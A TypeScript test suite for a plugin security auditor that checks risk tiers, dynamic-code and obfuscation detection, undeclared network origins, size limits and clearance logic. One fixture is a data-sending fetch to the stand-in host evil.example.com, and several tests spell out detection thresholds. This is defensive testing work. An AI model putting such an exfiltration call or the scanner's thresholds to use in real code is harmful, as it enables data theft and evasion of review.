import assert from 'node:assert/strict';
import { test } from 'node:test';
import { SIZE_LIMIT_BYTES, accessChanged, audit, scanPlugin, tierOf } from './audit.ts';
import type { Host } from './types.ts';

const noHost: Host = { networkOrigins: [], processes: [], commands: [], files: false, mcp: false, agentHooks: false };
const host = (extra: Partial<Host> = {}): Host => ({ ...noHost, ...extra });
const scan = (text: string, h: Host = noHost, bytes = Buffer.byteLength(text)) => scanPlugin({ text, bytes, truncated: false }, h);
const codes = (text: string, h?: Host) => scan(text, h).map((f) => f.code);

test('tier is high for processes, commands, files, mcp or agentHooks', () => {
  assert.equal(tierOf(host({ processes: ['my-cli sync'] })), 'high');
  assert.equal(tierOf(host({ commands: ['pbcopy'] })), 'high');
  assert.equal(tierOf(host({ files: true })), 'high');
  assert.equal(tierOf(host({ mcp: true })), 'high');
  assert.equal(tierOf(host({ agentHooks: true })), 'high');
  assert.equal(tierOf(host({ networkOrigins: ['https://x.org'], files: true })), 'high');
});

test('tier is medium for network origins only, low otherwise', () => {
  assert.equal(tierOf(host({ networkOrigins: ['https://api.github.com'] })), 'medium');
  assert.equal(tierOf(noHost), 'low');
});

test('dynamic-code flags eval, new Function and string timers', () => {
  assert.deepEqual(codes('const x = eval("1+1");'), ['dynamic-code']);
  assert.deepEqual(codes('const f = new Function("a", "return a");'), ['dynamic-code']);
  assert.deepEqual(codes('setTimeout("alert(1)", 10)'), ['dynamic-code']);
  assert.deepEqual(codes("setInterval('tick()', 10)"), ['dynamic-code']);
  assert.deepEqual(codes('setTimeout(`x()`, 10)'), ['dynamic-code']);
  const flag = scan('\n\nfoo(); eval (x)')[0]!;
  assert.match(flag.detail, /eval\( at line 3/);
});

test('dynamic-code ignores function timers and look-alike identifiers', () => {
  assert.deepEqual(codes('setTimeout(() => go(), 10); setInterval(tick, 5); retrieval(x); myeval(y);'), []);
  assert.deepEqual(codes('setTimeout(fn, 1)'), []);
});

test('obfuscated flags a very long line that is mostly escapes', () => {
  const line = '\\x41\\u0042'.repeat(1000);
  assert.ok(line.length > 5000);
  assert.deepEqual(codes(`ok();\n${line}`), ['obfuscated']);
  assert.match(scan(`ok();\n${line}`)[0]!.detail, /line 2/);
});

test('obfuscated does not flag short lines, lightly escaped long lines or exactly-at-threshold lines', () => {
  assert.deepEqual(codes('\\x41'.repeat(1000)), []);
  const light = `${'a'.repeat(6000)}${'\\x41'.repeat(10)}`;
  assert.deepEqual(codes(light), []);
  const exact = `${'\\x41'.repeat(450)}${'a'.repeat(4200)}`;
  assert.equal(exact.length, 6000);
  assert.deepEqual(codes(exact), []);
  assert.deepEqual(codes(`${'\\x41'.repeat(455)}${'a'.repeat(4180)}`), ['obfuscated']);
});

test('obfuscated flags base64 blobs over 20 KB', () => {
  assert.deepEqual(codes(`const d = "${'QUJD'.repeat(5200)}";`), ['obfuscated']);
  assert.deepEqual(codes(`const d = "${'QUJD'.repeat(5000)}";`), []);
});

test('undeclared-origin flags https origins missing from networkOrigins', () => {
  const flags = scan('fetch("https://evil.example.com/collect?x=1")', host({ networkOrigins: ['https://api.github.com'] }));
  assert.deepEqual(flags.map((f) => f.code), ['undeclared-origin']);
  assert.match(flags[0]!.detail, /https:\/\/evil\.example\.com/);
});

test('undeclared-origin accepts declared origins (with or without a trailing slash) and ignores schema URLs', () => {
  const h = host({ networkOrigins: ['https://api.github.com/', 'https://raw.githubusercontent.com'] });
  assert.deepEqual(codes('a("https://api.github.com/repos/x"); b("https://raw.githubusercontent.com/o/r")', h), []);
  assert.deepEqual(codes('const ns = "https://www.w3.org/2000/svg"; const s = "https://json-schema.org/draft/2020-12/schema";'), []);
  assert.deepEqual(codes('const ns = "http://www.w3.org/2000/svg"; fetch("http://insecure.example.com")'), []);
  assert.deepEqual(codes('const u = `https://${host}/path`;'), []);
});

test('undeclared-origin ignores github.com repository links', () => {
  assert.deepEqual(codes('const repo = "https://github.com/block/buzz-app";'), []);
  assert.deepEqual(codes('fetch("https://gist.github.com/x")'), ['undeclared-origin']);
});

test('undeclared-origin lists each origin once and caps the detail', () => {
  const text = Array.from({ length: 8 }, (_, i) => `"https://h${i}.example.com/a" "https://h${i}.example.com/b"`).join('\n');
  const [flag] = scan(text);
  assert.match(flag!.detail, /\(\+3 more\)/);
  assert.equal(flag!.detail.split('https://h0.example.com').length, 2);
});

test('size flags plugin.js over 3 MiB only', () => {
  const small = scanPlugin({ text: 'x', bytes: SIZE_LIMIT_BYTES, truncated: false }, noHost);
  assert.deepEqual(small, []);
  const big = scanPlugin({ text: 'x', bytes: SIZE_LIMIT_BYTES + 1, truncated: false }, noHost);
  assert.deepEqual(big.map((f) => f.code), ['size']);
});

test('a clean low-tier plugin has no flags', () => {
  assert.deepEqual(scan('export default { activate() { return 1; } };'), []);
});

test('accessChanged compares declared access with the previous pin, ignoring order', () => {
  const a = host({ networkOrigins: ['https://a.org', 'https://b.org'], commands: ['x y'] });
  assert.equal(accessChanged(a, undefined), false);
  assert.equal(accessChanged(a, host({ networkOrigins: ['https://b.org', 'https://a.org'], commands: ['x y'] })), false);
  assert.equal(accessChanged(a, host({ networkOrigins: ['https://a.org'], commands: ['x y'] })), true);
  assert.equal(accessChanged(a, host({ networkOrigins: ['https://a.org', 'https://b.org'], commands: ['x z'] })), true);
  assert.equal(accessChanged(host({ files: true }), host()), true);
  assert.equal(accessChanged(host({ mcp: true }), host({ mcp: true })), false);
  assert.equal(accessChanged(host({ agentHooks: true }), host()), true);
});

const base = { key: 'github.com/o/r', commit: 'd'.repeat(40), checkedAt: '2026-11-05T23:00:00Z' };
const plugin = (text = 'ok();') => ({ text, bytes: text.length, truncated: false });

test('low and medium listings without flags are cleared automatically', () => {
  assert.equal(audit({ ...base, host: noHost, plugin: plugin(), cleared: new Set() }).cleared, true);
  assert.equal(audit({ ...base, host: host({ networkOrigins: ['https://x.org'] }), plugin: plugin('"https://x.org/a"'), cleared: new Set() }).cleared, true);
});

test('high-tier listings are uncleared unless cleared.txt names this commit', () => {
  const h = host({ processes: ['my-cli sync'] });
  assert.equal(audit({ ...base, host: h, plugin: plugin(), cleared: new Set() }).cleared, false);
  assert.equal(audit({ ...base, host: h, plugin: plugin(), cleared: new Set([`${base.key} ${base.commit}`]) }).cleared, true);
  assert.equal(audit({ ...base, host: h, plugin: plugin(), cleared: new Set([`${base.key} ${'e'.repeat(40)}`]) }).cleared, false);
});

test('any flag makes a listing uncleared, and the result carries tier, flags and checkedAt', () => {
  const result = audit({ ...base, host: noHost, plugin: plugin('eval("1")'), cleared: new Set() });
  assert.equal(result.tier, 'low');
  assert.equal(result.cleared, false);
  assert.deepEqual(result.flags.map((f) => f.code), ['dynamic-code']);
  assert.equal(result.checkedAt, base.checkedAt);
  const cleared = audit({ ...base, host: noHost, plugin: plugin('eval("1")'), cleared: new Set([`${base.key} ${base.commit}`]) });
  assert.equal(cleared.cleared, true);
  assert.equal(cleared.flags.length, 1);
});

test('accessChanged does not by itself make a listing uncleared', () => {
  const result = audit({ ...base, host: host({ networkOrigins: ['https://x.org'] }), previousHost: noHost, plugin: plugin(), cleared: new Set() });
  assert.equal(result.accessChanged, true);
  assert.equal(result.cleared, true);
});
